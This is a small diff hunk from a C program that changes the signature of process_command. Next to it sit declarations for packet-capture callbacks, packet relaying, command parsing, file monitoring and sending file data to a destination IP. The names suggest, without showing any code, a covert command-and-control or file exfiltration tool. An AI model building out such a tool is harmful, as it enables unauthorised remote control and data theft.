@@ -106,7 +106,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 void pkt_callback_relay(u_char *ptr_null, const struct pcap_pkthdr * pkt_header, const u_char* packet);
 int relayPacket(char * payload, int size_payload, const char * src_ip, const char * dest_ip, const int dest_port, int protocol);
 int parse_cmd(char * command, char * data, int size);
-int process_command(char * command, const struct ip_struct * ip, const int dest_port, int protocol);
+int process_command(char * command, const char * src_ip, const char * dest_ip, const int dest_port, int protocol);
 int send_file_data(const char* folder, const char * fileName, const char* src_ip, const char* dest_ip, const int dest_port, int protocol);
 int initFileMonitor(struct filelist* folder, const char* src_ip, const char* dest_ip, const int dest_port, int protocol);
 
